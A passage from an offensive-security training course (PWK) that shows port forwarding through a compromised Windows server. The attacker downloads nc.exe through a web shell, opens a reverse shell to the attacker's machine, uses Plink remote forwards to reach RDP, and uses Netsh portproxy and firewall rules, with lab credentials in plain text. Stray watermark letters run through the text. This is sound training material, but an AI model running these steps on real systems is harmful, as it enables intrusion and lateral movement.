Apache2 web root.
n
kali@kali:~$ find / -name nc.exe 2>/dev/null
/usr/share/windows-resources/binaries/nc.exe
i
kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
z
Listing 566 - Copying nc.exe to the Apache2 webroot.
Once the executable’s there, we should be able to download it to MULTISERVER03. We will use a
D
PowerShell wget one-liner from our web shell to download nc.exe.
From the web shell, we’ll run a command that will instruct PowerShell to download nc.exe from
our Kali machine web server (-Uri http://192.168.118.4/nc.exe) and write it to C:\Windows\Temp
on MULTISERVER03 with -OutFile. Put together, we run the following:
powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
Listing 567 - The PowerShell command we use to download nc.exe to MULTISERVER03 through the web shell.
Once the PowerShell command is executed, our payload is downloaded from our Apache2 server
to C:\Windows\Temp\nc.exe on MULTISERVER03.
We can then set up a Netcat listener on port 4446 on our Kali machine.
kali@kali:~$ nc -nvlp 4446
listening on [any] 4446 ...
Listing 568 - The Netcat listener on our Kali machine.
Once the listener is running, we’ll execute nc.exe on MULTISERVER03 using the web shell again,
passing -e to execute cmd.exe once the connection is established.
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446
Listing 569 - The nc.exe reverse shell payload we execute in the web shell.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 603
Made in Morocco
Penetration Testing with Kali Linux
The shell quickly hits our listener.
...
listening on [any] 4446 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.64] 51889
Microsoft Windows [Version 10.0.20348.825]
(c) Microsoft Corporation. All rights reserved.
c:\windows\system32\inetsrv>
Listing 570 - The shell from nc.exe caught by our Netcat listener.
We now want to download Plink to MULTISERVER03. On our Kali machine, we can copy plink.exe
from windows-resources/binaries to the Apache2 web root.
kali@kali:~$ find / -name plink.exe 2>/dev/null
/usr/share/windows-resources/binaries/plink.exe y
kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
k
[sudo] password for kali:
kali@kali:~$
s
Listing 571 - Copying plink.exe to our Apache2 webroot.
In our reverse shell, we’ll again use the PowerSheoll one-liner to download plink.exe from our Kali
machine to C:\Windows\Temp.
c:\windows\system32\inetsrv>powershell nwget -Uri http://192.168.118.4/plink.exe -
OutFile C:\Windows\Temp\plink.exe
powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
i
c:\windows\system32\inetsrv> z
Listing 572 - Plink downloaded to the C:folder.
D
With the Plink executable downloaded to MULTISERVER03, we can now consider using it.
In this case, let’s set up Plink with a remote port forward so that we can access the
MULTISERVER03 RDP port from our Kali machine. The command syntax to set up a remote port
forward with Plink is very similar to the OpenSSH client remote port forward command. After the -
R option, we’ll pass the socket we want to open on the Kali SSH server, and the RDP server port
on the loopback interface of MULTISERVER03 that we want to forward packets to.
We will also pass the username (-l) and password (-pw) directly on the command line.
This might log our Kali password somewhere undesirable! If we’re in a hostile
network, we may wish to create a port-forwarding only user on our Kali machine
for remote port forwarding situations.
c:\windows\system32\inetsrv>C:\Windows\Temp\plink.exe -ssh -l kali -pw  -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389
192.168.118.4
The host key is not cached for this server:
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 604
Made in Morocco
Penetration Testing with Kali Linux
192.168.118.4 (port 22)
You have no guarantee that the server is the computer
you think it is.
The server's ssh-ed25519 key fingerprint is:
ssh-ed25519 255 SHA256:q1QQjIxHhSFXfEIT4gYrRF+zKr0bcLMOJljoINxThxY
If you trust this host, enter "y" to add the key to
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n, Return cancels connection, i for more info) y
Using username "kali".
Linux kali 5.16.0-kali7-amd64 #1 SMP PREEMPT Debian 5.16.18-1kali1 (2022-04-01) x86_64
The programs included with the Kali GNU/Linux system are freey software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
k
Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
s
Last login: Sun Aug 21 15:50:39 2022 from 192.168.50.64
kali@kali:~$
Listing 573 - Making an SSH cononection to the Kali machine.
We are presented with a prompt asking if we want to store the server key in the cache.
n
In much the same way that it’s not possible to accept the SSH client key cache
i
prompt from a non-TTY shell on Linux, with some very limited shells with Plink on
z
Windows, we also won’t be able to respond to this prompt. An easy solution in
that case would be to automate the confirmation with cmd.exe /c echo y, piped
D
into the plink.exe command. This will emulate the confirmation that we usually
type when prompted. The entire command would be: cmd.exe /c echo y | ..exe -
ssh -l kali -pw  -R 127.0.0.1:9833:127.0.0.1:3389
192.168.41.7.
We can confirm that the port has opened on our Kali machine using ss.
kali@kali:~$ ss -ntplu
Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process
tcp LISTEN 0 128 127.0.0.1:9833 0.0.0.0:*
tcp LISTEN 0 5 0.0.0.0:80 0.0.0.0:*
users:(("python3",pid=1048255,fd=3))
tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*
tcp LISTEN 0 128 [::]:22 [::]:*
kali@kali:~$
Listing 574 - Port 9983 opened on the Kali loopback interface.
Port 9833 is opened on the loopback interface of our Kali machine.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 605
Made in Morocco
Penetration Testing with Kali Linux
y
k
Figure 255: The traffic flow from the listening port opened on our Kali server to the RDP port open on MULTISERVER03,
behind the firewall
s
Now we can connect to port 9983 on our Kali loopback interface with xfreerdp as the rdp_admin
user. To specify a custom RDP port in xfreerdp, we simply append :9833 to the IP address.
o
kali@kali:~$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
...
n
Certificate details for 127.0.0.1:9833 (RDP-Server):
Common Name: MULTISERVER03
Subject: CN = MULTISERVER03
i
Issuer: CN = MULTISERVER03
z
Thumbprint:
4a:11:2d:d8:03:8e:dd:5c:f2:c4:71:7e:15:1d:20:fb:62:3f:c6:eb:3d:77:1e:ea:44:47:10:42:49
:fa:1e:6a D
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) y
[05:11:17:430] [1072332:1072333] [ERROR][com.winpr.timezone] - Unable to find a match
for unix timezone: US/Eastern
...
Listing 575 - Connecting to the RDP server with xfreerdp, through the Plink port forward.
The connection succeeds, and we get an RDP connection through our Plink remote port forward!
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 606
Made in Morocco
Penetration Testing with Kali Linux
y
k
s
o
n
i
z
D
Figure 256: Connected to MULTISERVER03 through the remote port forward.
In this section, we used Plink to create a remote port forward to access the RDP service on
MULTISERVER03. We also considered some theoretical problems when initiating Plink in more
restrictive shells, and explored piping keystrokes into Plink as a solution.
18.4.3 Netsh
There is a native way to create a port forward on Windows we should explore: the built-in firewall
configuration tool Netsh931 (also known as Network Shell). Using Netsh, we can set up a port
forward with the portproxy932 subcontext933 within the interface context.934 While Netsh requires
administrative privileges to create a port forward on Windows, it can be very useful in some
restrictive situations.
Let’s consider a slight modification of the previous scenario. MULTISERVER03 is serving its web
application on TCP port 80 on the perimeter. CONFLUENCE01 is no longer accessible on the
931 (Microsoft, 2019), https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh
932 (Microsoft, 2021), https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy
933 (Microsoft, 2021), https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts#subcontexts
934 (Microsoft, 2021), https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 607
Made in Morocco
Penetration Testing with Kali Linux
WAN interface. For simplicity, the firewall on MULTISERVER03 also allows inbound TCP port
3389, meaning we are able to log in over RDP directly.
y
k
s
Figure 257: The network setup for this scenario
o
We want to SSH into PGDATABASE01 directly from our Kali machine. To do this, we’ll need to
create a port forward on MULTISERVER03 that will listen on the WAN interface and forward
packets to the SSH port on PGDATABASE0n1.
i
The portproxy subcontext of the netsh interface command requires
z
administrative privileges to make any changes. This means that in most cases
we will need to take UAC into account. In this example, we’re running it in a shell
over RDP using an Daccount with administrator privileges, so UAC is not a
concern. However, we should bear in mind that UAC may be a stumbling block in
other setups.
To start setting up a port forward, let’s RDP directly into MULTISERVER03 from our Kali machine
using xfreerdp again.
kali@kali:~$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64
[07:48:02:576] [265164:265165] [WARN][com.freerdp.crypto] - Certificate verification
failure 'self signed certificate (18)' at stack position 0
[07:48:02:577] [265164:265165] [WARN][com.freerdp.crypto] - CN = MULTISERVER03
[07:48:03:685] [265164:265165] [ERROR][com.winpr.timezone] - Unable to find a match
for unix timezone: US/Eastern
[07:48:03:886] [265164:265165] [INFO][com.freerdp.gdi] - Local framebuffer format
PIXEL_FORMAT_BGRX32
[07:48:03:886] [265164:265165] [INFO][com.freerdp.gdi] - Remote framebuffer format
PIXEL_FORMAT_BGRA32
[07:48:03:940] [265164:265165] [INFO][com.freerdp.channels.rdpsnd.client] - [static]
Loaded fake backend for rdpsnd
[07:48:03:940] [265164:265165] [INFO][com.freerdp.channels.drdynvc.client] - Loading
Dynamic Virtual Channel rdpgfx
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 608
Made in Morocco
Penetration Testing with Kali Linux
Listing 576 - Connecting to the RDP server with xfreerdp.
In our RDP session, we can run cmd.exe as administrator to open a command window.
Using this window, we can run Netsh. We’ll instruct netsh interface to add a portproxy rule from
an IPv4 listener that is forwarded to an IPv4 port (v4tov4). This will listen on port 2222 on the
external-facing interface (listenport=2222 listenaddress=192.168.50.64) and forward packets to
port 22 on PGDATABASE01 (connectport=22 connectaddress=10.4.50.215).
C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=2222
listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
C:\Windows\system32>
Listing 577 - The portproxy command being run.
Although we don’t receive any output from the command, we cayn confirm that port 2222 is
listening using netstat.
k
C:\Windows\system32>netstat -anp TCP | find "2222"
TCP 192.168.50.64:2222 0.0.0.0:0 LISTENING
s
C:\Windows\system32>
Listing 578 - netstat showing that TCP/2222 is listening on the external interface.
o
We can also confirm that the port forward is stored by issuing the show all command in the netsh
interface portproxy subcontext.
n
C:\Windows\system32>netsh interface portproxy show all
i
Listen on ipv4: Connect to ipv4:
z
Address Port Address Port
--------------- ---------- --------------- ----------
D
192.168.50.64 2222 10.4.50.215 22
Listing 579 - Listing all the portproxy port forwarders set up with Netsh.
The port is listening, and the port forward is set up.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 609
Made in Morocco
Penetration Testing with Kali Linux
Figure 258: The port forward set up on MULTISERVER03 will forward packets recieved on port 2222 to port 22 on
PGDATABASE01
However, there’s a problem. We can’t connect to port 2222 from our Kali machine. We’ll
specifically check port 2222 using nmap.
kali@kali:~$ sudo nmap -sS 192.168.50.64 -Pn -n -p2222
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-21 06:27 EDT
Nmap scan report for 192.168.50.64
Host is up (0.00055s latency).
PORT STATE SERVICE
2222/tcp filtered EtherNetIP-1
MAC Address: 00:0C:29:A9:9F:3D (VMware)
Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds
y
Listing 580 - Nmap showing that port 2222 on MULTISERVER03 is filtered.
The response shows that port 2222 is filtered. It’s most likkely that the Windows Firewall is
blocking inbound connections to port 2222.
s
o
n
i
z
D
Figure 259: The Windows firewall blocking our attempt to connect to port 2222 on MULTISERVER03 from our Kali
machine on the WAN network
In order to access it, we need to poke a hole in the firewall on MULTISERVER03.
We’ll also need to remember to plug that hole as soon as we’re finished with it!
We can use the netsh advfirewall firewall subcontext to create the hole. We will use the add rule
command and name the rule “port_forward_ssh_2222”. We need to use a memorable or
descriptive name, because we’ll use this name to delete the rule later on.
We’ll allow connections on the local port (localport=2222) on the interface with the local IP
address (localip=192.168.50.64) using the TCP protocol, specifically for incoming traffic (dir=in).
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 610
Made in Morocco
Penetration Testing with Kali Linux
C:\Windows\system32> netsh advfirewall firewall add rule name="port_forward_ssh_2222"
protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
Ok.
C:\Windows\system32>
Listing 581 - Poking a hole in the Windows Firewall with Netsh.
The command completes successfully with an “Ok.” response. We can check how the port
appears from our Kali machine again.
kali@kali:~$ sudo nmap -sS 192.168.50.64 -Pn -n -p2222